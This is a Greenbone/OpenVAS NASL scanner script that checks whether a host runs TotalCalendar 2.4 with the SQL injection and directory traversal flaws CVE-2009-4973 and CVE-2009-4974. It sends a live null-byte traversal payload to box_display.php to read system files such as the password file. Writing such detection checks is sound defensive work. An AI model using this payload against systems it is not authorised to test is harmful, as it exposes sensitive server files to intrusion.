if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902225" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-08-02 12:38:17 +0200 (Mon, 02 Aug 2010)" );
	script_cve_id( "CVE-2009-4973", "CVE-2009-4974" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "TotalCalendar SQL Injection and Directory Traversal Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/9524" );
	script_xref( name: "URL", value: "http://en.securitylab.ru/nvd/396246.php" );
	script_xref( name: "URL", value: "http://en.securitylab.ru/nvd/396247.php" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Host/runs_unixoide" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "insight", value: "The flaw exists due to:

  - An improper validation of user supplied data to 'selectedCal' parameter
  in a 'SwitchCal' action within the 'modfile.php' script.

  - An improper validation of user supplied data to 'box' parameter to script
 'box_display.php'." );
	script_tag( name: "solution", value: "Upgrade to version 2.403 or later." );
	script_tag( name: "summary", value: "This host is running TotalCalendar and is prone to SQL injection
  and directory traversal vulnerabilities." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code and manipulate SQL queries by injecting
  arbitrary SQL code in a user's browser session in context of an affected site." );
	script_tag( name: "affected", value: "TotalCalendar version 2.4" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/projects/TotalCalendar", "/TotalCalendar", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(ContainsString( res, "Event calendar powered by TotalCalendar>" )){
		files = traversal_files( "linux" );
		for pattern in keys( files ) {
			file = files[pattern];
			url = NASLString( dir, "/box_display.php?box=../../../../../../../../" + file + "%00.htm" );
			req = http_get( item: url, port: port );
			res = http_keepalive_send_recv( port: port, data: req );
			if(egrep( string: res, pattern: pattern, icase: TRUE )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( data: report, port: port );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

